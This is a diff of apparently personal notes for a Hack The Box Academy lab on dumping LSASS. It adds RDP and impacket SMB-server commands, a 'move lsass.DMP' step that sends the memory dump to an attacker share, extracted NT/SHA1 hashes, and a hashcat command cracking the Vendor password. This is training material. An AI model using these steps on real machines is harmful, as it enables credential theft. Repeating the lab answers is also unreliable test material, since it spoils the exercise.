@@ -108,7 +108,7 @@ HTB_@cademy_stdnt!
 
 RDP:
 ```go
-xfreerdp /v:STIMP /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+xfreerdp /v:10.129.224.38 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
 ```
 
 1) What is the name of the executable file associated with the Local Security Authority Process?
@@ -119,3 +119,62 @@ lsass.exe
 2) Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)
 ```go
 ```
+
+Create a share to connect back to your attack host and specify where to store the dump file:
+```go
+sudo impacket-smbserver -smb2support Attacking_LSASS ~/Documents
+```
+
+>[! Hint ]
+>Reference [[Attacking SAM#Syntax for smbserver.py]] to move dump file to attack host share
+
+RDP into the machine with the above xfreerdp command and create the dump file, `lsass.DMP`
+![[Pasted image 20250508175203.png]]
+
+On the windows machine, move the lsass.DMP file to the attack host share 
+```go
+move lsass.DMP \\AttackHostIP\Attacking_LSASS
+```
+
+
+Scroll down and you will see a LogonSession for the user  `Vendor`.
+```go
+== LogonSession ==
+authentication_id 124843 (1e7ab)
+session_id 0
+username Vendor
+domainname FS01
+logon_server FS01
+logon_time 2025-05-08T22:59:17.942120+00:00
+sid S-1-5-21-2288469977-2371064354-2971934342-1003
+luid 124843
+        == MSV ==
+                Username: Vendor
+                Domain: FS01
+                LM: NA
+                NT: 31f87811133bc6aaa75a536e77f64314
+                SHA1: 2b1c560c35923a8936263770a047764d0422caba
+                DPAPI: 0000000000000000000000000000000000000000
+        == WDIGEST [1e7ab]==
+                username Vendor
+                domainname FS01
+                password None
+                password (hex)
+        == Kerberos ==
+                Username: Vendor
+                Domain: FS01
+        == WDIGEST [1e7ab]==
+                username Vendor
+                domainname FS01
+                password None
+                password (hex)
+
+```
+
+Crack the NT hash
+```go
+hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt --show
+31f87811133bc6aaa75a536e77f64314:Mic@123
+```
+
+
